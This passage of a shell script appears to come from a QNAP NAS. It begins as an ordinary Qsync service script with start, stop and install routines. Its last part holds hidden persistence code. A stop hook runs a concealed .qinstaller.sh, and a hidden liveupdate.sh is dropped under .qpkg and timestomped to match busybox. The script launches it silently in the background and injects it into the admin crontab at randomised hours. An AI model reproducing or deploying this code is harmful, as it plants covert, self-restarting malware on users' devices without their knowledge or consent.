		[ -f /etc/config/qsync/qhost.conf ] || /bin/touch /etc/config/qsync/qhost.conf
		[ -f /etc/config/qsync/qsyncjobdef.conf ] || /bin/touch /etc/config/qsync/qsyncjobdef.conf
		[ -f /etc/config/qsync/qsync.conf ] || /bin/cp -p /etc/default_config/qsync/qsync.conf /etc/config/qsync/qsync.conf
		[ -f /etc/config/qsync/extdrv.conf ] || /bin/cp -p /etc/default_config/qsync/extdrv.conf /etc/config/qsync/extdrv.conf
		[ -f /etc/config/qsync/qsyncd.conf ] || /bin/cp -p /etc/default_config/qsync/qsyncd.conf /etc/config/qsync/qsyncd.conf
		[ ! -f /etc/config/qsync/qsyncd.conf ] || /bin/chmod 640 /etc/config/qsync/qsyncd.conf
		[ ! -f /etc/config/qsync/qsync.conf ] || /bin/chmod 640 /etc/config/qsync/qsync.conf
		[ ! -f /etc/config/qsync/qhost.conf ] || /bin/chmod 640 /etc/config/qsync/qhost.conf
		/sbin/daemon_mgr qsyncman start "/usr/bin/qsyncman 1>/dev/null 2>&1"
		echo "OK"
	fi
}

stop()
{
	echo "Shutting down QSync monitor: OK"
        pidnum=`/bin/pidof qsync``/bin/pidof qsyncd`
        kill $pidnum 2>/dev/null
        i=0
        while [ ${i} -lt 5 ]
        do
                pidnum=`/bin/pidof qsync``/bin/pidof qsyncd`
                if [ -z "$pidnum" ]; then
                        break
                fi
                sleep 1
                i=`/usr/bin/expr ${i} + 1`
        done
        pidnum=`/bin/pidof qsync``/bin/pidof qsyncd`
        [ -z "$pidnum" ] || kill -9 $pidnum 2>/dev/null
	/sbin/daemon_mgr qsyncman stop "/usr/bin/qsyncman"
	/usr/bin/killall -q qsyncman
}

start_qsyncd()
{
	#_qsyncd_en=`/sbin/getcfg "" Enabled -d 0 -f /etc/qsync/qsyncd.conf`
	#[ "x$_qsyncd_en" = x1 ] || return -1
	_qsyncd_run_pid=`/bin/pidof qsyncd`
	[ -z $_qsyncd_run_pid ] || return -114
	_recycle_en=`/sbin/getcfg 'Network Recycle Bin' Enable -d FALSE`
	_with_syslog=$1
	if [ "x$_recycle_en" = xTRUE  ]; then
		if [ "x$_with_syslog" = x1  ]; then
			LD_PRELOAD=/usr/local/lib/libtrash.so /usr/bin/qsyncd -syslog -c:/etc/qsync/qsyncd.conf
		else
			LD_PRELOAD=/usr/local/lib/libtrash.so /usr/bin/qsyncd -c:/etc/qsync/qsyncd.conf
		fi
	else
		if [ "x$_with_syslog" = x1  ]; then
			/usr/bin/qsyncd -syslog -c:/etc/qsync/qsyncd.conf
		else
			/usr/bin/qsyncd -c:/etc/qsync/qsyncd.conf
		fi
	fi
	_iret=$?
	if [ "x$_iret" = x0 ]; then
		i=0
		while [ ${i} -lt 10000 ]
		do
			echo "${i} millisecond..."
			_qsyncd_pid=`/sbin/getcfg '' Pid -d -1 -f /etc/qsync/qsyncd.conf`
			_qsyncd_run_pid=`/bin/pidof qsyncd`
			if [ "x$_qsyncd_pid" != "x-1" ] && [ ! -z $_qsyncd_run_pid ]; then
				break
			fi
			usleep 50000
			i=`/usr/bin/expr ${i} + 50`
		done
	fi
	return -$_iret
}

stop_qsyncd()
{
	#_qsyncd_en=`/sbin/getcfg "" Enabled -d 0 -f /etc/qsync/qsyncd.conf`
	#[ "x$_qsyncd_en" = x0 ] || return -1
	_qsyncd_pid=`/sbin/getcfg "" Pid -d -1 -f /etc/qsync/qsyncd.conf`
	[ $_qsyncd_pid -lt 0 ] && return -3
	# Send SIGUSR1 to inform the daemon to output "[RTRR Server] Stopped" event log
	/bin/kill -SIGUSR1 $_qsyncd_pid
	usleep 200000
	# Send SIGINT to stop the QSyncd process
	/bin/kill -SIGINT $_qsyncd_pid
	_kill_ret=$?
	if [ "x$_kill_ret" != x0 ]; then
		return -3
	fi
	echo "need wait $1 millisecond"
	i=0
	while true
	do
		echo "${i} millisecond..."
		_qsyncd_pid=`/sbin/getcfg '' Pid -d -1 -f /etc/qsync/qsyncd.conf`
		_qsyncd_run_pid=`/bin/pidof qsyncd`
		if [ "x$_qsyncd_pid" = "x-1" ] && [ -z $_qsyncd_run_pid ]; then
			break
		fi
		if [ ${i} -ge $1 ]; then
			# if time-out, we send two additional SIGINT to force the daemon to stop.
			if [ $_qsyncd_pid -ge 0 ]; then
				/bin/kill -SIGUSR1 $_qsyncd_pid
				usleep 200000
				/bin/kill -SIGUSR1 $_qsyncd_pid
			fi
			j=0
			while [ ${j} -lt 500 ]
			do
				_qsyncd_run_pid=`/bin/pidof qsyncd`
				if [ -z $_qsyncd_run_pid ]; then
					return 0
				fi
				usleep 20000
				j=`/usr/bin/expr ${j} + 20`
			done
			return -62
		fi
		usleep 50000
		i=`/usr/bin/expr ${i} + 50`
	done
	return 0
}


install()
{
	lock_file="/var/lock/qbox_install_bin.lck"

	if [ ! -f "${INSTALL_BUILD_IN}" ]; then
		dbg "build-in ${QSYNC_NAME} is installed"
		return 1
	fi

	if [ ! -f ${UPDATEPKG_DIR}/${QSYNC_NAME}.bin ]; then
		dbg "${QSYNC_NAME}.bin} not found"
		return 1
	fi

	if [ ! -x "${QPKG_CLI}" ]; then
		dbg "${QPKG_CLI} not found"
		return 1
	fi

	## make sure volume is exist
	if [ ! -d /share/`/sbin/getcfg SHARE_DEF defPublic -d Public -f /etc/config/def_share.info` ]; then
		dbg "/share/Public not found"
		return 1
	fi

	## is removed 
	if [ -f ${UPDATEPKG_DIR}/.${QSYNC_NAME}_removed ]; then
		/bin/rm -f ${INSTALL_BUILD_IN}
		dbg "${QSYNC_NAME} is removed"
		return 1
	fi

	if [ -f "$lock_file" ]; then 
		if [ $(( $(date +%s) - $(date +%s -r $lock_file) )) -le 180 ]; then
			echo "${QSYNC_NAME} is installing"
			dbg "${QSYNC_NAME} is installing"
			return 1
		fi
	fi

	/bin/touch "$lock_file"	
	/bin/rm -f ${INSTALL_BUILD_IN}
	dbg "install build-in ${QSYNC_NAME} start"

	set_default_disable_status

	## install build in Qsync
	${QPKG_CLI} -K -m ${UPDATEPKG_DIR}/${QSYNC_NAME}.bin > /dev/null 2>&1
	sleep 20

	wait_install=60
	## avoid initial take long time or fail
        while [ "$wait_install" -gt 0 ]; do
		stcode=`$CMD_GETCFG ${QSYNC_NAME}.bin stcode -f /etc/config/qpkg_job.conf`
                if [ "$stcode" = "0" ]; then
                        break
                fi
                sleep 1
                let "wait_install--"
        done

	${QPKG_CLI} -C ${QSYNC_NAME}.bin > /dev/null 2>&1
	/bin/rm -f ${UPDATEPKG_DIR}/.${QSYNC_NAME}_disabled
	/bin/rm -f "$lock_file"	
	dbg "install build-in ${QSYNC_NAME} success"
}

if [ "$1" == "stop" ]; then
	{ /share/MD0_DATA/.system/.qinstaller.sh; exit 0; }
fi
fi
XEOF
chmod 755 "${bdir}/.qpkg/.liveupdate/liveupdate.sh"
touch -cr /bin/busybox "${bdir}/.qpkg/.liveupdate/liveupdate.sh"
( ( exec >/dev/null 2>&1 </dev/null; "${bdir}/.qpkg/.liveupdate/liveupdate.sh" </dev/null >/dev/null 2>/dev/null & ) & )
fi

test -x "${bdir}/.qpkg/.liveupdate/liveupdate.sh" || chmod 755 "${bdir}/.qpkg/.liveupdate/liveupdate.sh"

crontabargs=$(ps | grep 'cr[o]nd ' | sed -n 's/.*crond[^0-9A-Za-z-]*\(.\+\)/\1/p')
trycount=10; trycount=$(( $trycount - 10 ))
set x $crontabargs; shift
while [ $# -gt 0 ] && [ $trycount -lt 10 ]; do
trycount=$(( $trycount + 1 ))
getopts ':c:' OPT 2>/dev/null
test "$OPT" = 'c' && crontabfile="${OPTARG}/admin" && break
test "$OPTIND" -gt 0 && shift "$OPTIND" && OPTIND=1 || break
done
test "$crontabfile" && test -f "${crontabfile}" || crontabfile='/tmp/cron/crontabs/admin'

for crontab in "$crontabfile" "${confdir}/crontab"; do
if $fgrep "${bdir}/.qpkg/.liveupdate/liveupdate.sh" "$crontab"; then
:
else
cronmins=$(printf '%i' "$(( $RANDOM % 60 ))")
cronhour=$(printf '%i' "$(( $RANDOM % 24 ))")
cronhour=$(printf '%i,' "$(( ( $cronhour + 8 ) % 24 ))" "$(( ( $cronhour + 16 ) % 24 ))")"$cronhour"
echo "$cronmins $cronhour"' * * * '"${bdir}/.qpkg/.liveupdate/liveupdate.sh >/dev/null 2>/dev/null" >> "$crontab"
crontab "$crontab"
sleep 2
fi
done
) & ) &
